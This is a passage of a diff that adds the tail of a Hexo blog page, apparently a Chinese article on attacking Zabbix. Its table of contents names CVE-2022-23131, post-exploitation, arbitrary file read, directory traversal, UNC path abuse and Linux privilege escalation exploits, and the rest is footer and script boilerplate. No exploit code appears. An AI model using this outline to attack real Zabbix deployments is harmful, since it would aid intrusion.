href="#CVE-2022-23131"><span class="toc-article-text">CVE-2022-23131</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8"><span class="toc-article-text">后渗透利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-article-text">配置文件</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%84%9A%E6%9C%AC%E4%B8%8B%E5%8F%91"><span class="toc-article-text">脚本下发</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#zabbix-get"><span class="toc-article-text">zabbix_get</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#UserParameter"><span class="toc-article-text">UserParameter</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-article-text">任意文件读取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-article-text">目录遍历</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%BB%E5%8A%A8%E6%A3%80%E6%9F%A5%E6%A8%A1%E5%BC%8F%E5%88%A9%E7%94%A8"><span class="toc-article-text">主动检查模式利用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows-UNC%E8%B7%AF%E5%BE%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">Windows UNC路径利用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-article-text">提权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%84%8F%E7%89%9B"><span class="toc-article-text">脏牛</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#2021-3156"><span class="toc-article-text">2021-3156</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#2021-4034"><span class="toc-article-text">2021-4034</span></a></li></ol></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 hitman's Blog
+  
+      . wubba <a href="http://hexo.io/" target="_blank">lubba</a> dub <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank"> dub.</a>  
+</p>
+
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
